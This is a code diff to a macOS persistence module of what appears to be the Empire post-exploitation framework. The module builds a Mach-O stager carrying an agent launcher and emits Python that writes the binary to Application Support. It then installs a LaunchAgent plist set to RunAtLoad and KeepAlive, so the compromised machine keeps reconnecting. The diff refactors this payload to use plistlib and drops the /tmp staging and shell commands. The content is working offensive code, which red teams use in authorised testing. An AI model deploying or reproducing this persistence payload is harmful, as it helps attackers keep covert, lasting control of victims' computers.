@@ -2,6 +2,7 @@ import base64
 
 from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
+from empire.server.utils import module_util
 
 
 class Module:
@@ -28,65 +29,42 @@ class Module:
         launcher = launcher.strip('"')
 
         macho_bytes = main_menu.stagergenv2.generate_macho(launcher_code=launcher)
-        enc_bytes = base64.b64encode(macho_bytes)
+        module_util.ensure_python3_macho_template(
+            macho_bytes, "data/misc/machotemplate"
+        )
+        enc_bytes = base64.b64encode(macho_bytes).decode()
 
-        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>%s</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>%s</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-</dict>
-</plist>"""
-
+        # The plist is built on the agent with plistlib so the daemon path is
+        # escaped correctly, and written straight to its final location: no
+        # /tmp staging, no chown, no shell (BC-SECURITY/Empire#828).
         return f"""
-import subprocess
-import sys
 import base64
 import os
+import plistlib
 
-isRoot = True if os.geteuid() == 0 else False
-user = os.environ['USER']
-group = 'wheel' if isRoot else 'staff'
+label = {daemon_name!r}
+base = '/' if os.geteuid() == 0 else os.path.expanduser('~')
+launch_dir = os.path.join(base, 'Library', 'LaunchAgents')
+daemon_dir = os.path.join(base, 'Library', 'Application Support', label)
+daemon_path = os.path.join(daemon_dir, {program_name!r})
+plist_path = os.path.join(launch_dir, {plist_filename!r})
 
-launchPath = '/Library/LaunchAgents/' if isRoot else '/Users/'+user+'/Library/LaunchAgents/'
-daemonPath = '/Library/Application Support/{daemon_name}/' if isRoot else '/Users/'+user+'/Library/Application Support/{daemon_name}/'
+os.makedirs(daemon_dir, exist_ok=True)
+with open(daemon_path, 'wb') as f:
+    f.write(base64.b64decode("{enc_bytes}"))
+os.chmod(daemon_path, 0o755)
 
-encBytes = "{enc_bytes}"
-bytes = base64.b64decode(encBytes)
-plist = \"\"\"{plistSettings}
-\"\"\" % ('{daemon_name}', daemonPath+'{program_name}')
+os.makedirs(launch_dir, exist_ok=True)
+plist = {{
+    'Label': label,
+    'ProgramArguments': [daemon_path],
+    'RunAtLoad': True,
+    'KeepAlive': True,
+}}
+with open(plist_path, 'wb') as f:
+    plistlib.dump(plist, f)
+os.chmod(plist_path, 0o644)
 
-if not os.path.exists(daemonPath):
-    os.makedirs(daemonPath)
-
-e = open(daemonPath+'{program_name}','wb')
-e.write(bytes)
-e.close()
-
-os.chmod(daemonPath+'{program_name}', 0755)
-
-f = open('/tmp/{plist_filename}','w')
-f.write(plist)
-f.close()
-
-os.chmod('/tmp/{plist_filename}', 0644)
-
-process = subprocess.Popen('chown '+user+':'+group+' /tmp/{plist_filename}', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
-process = subprocess.Popen('mv /tmp/{plist_filename} '+launchPath+'{plist_filename}', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
-print("\\n[+] Persistence has been installed: "+launchPath+"{plist_filename}")
-print("\\n[+] Empire daemon has been written to "+daemonPath+"{program_name}")
-
+print("\\n[+] Persistence has been installed: " + plist_path)
+print("\\n[+] Empire daemon has been written to " + daemon_path)
 """
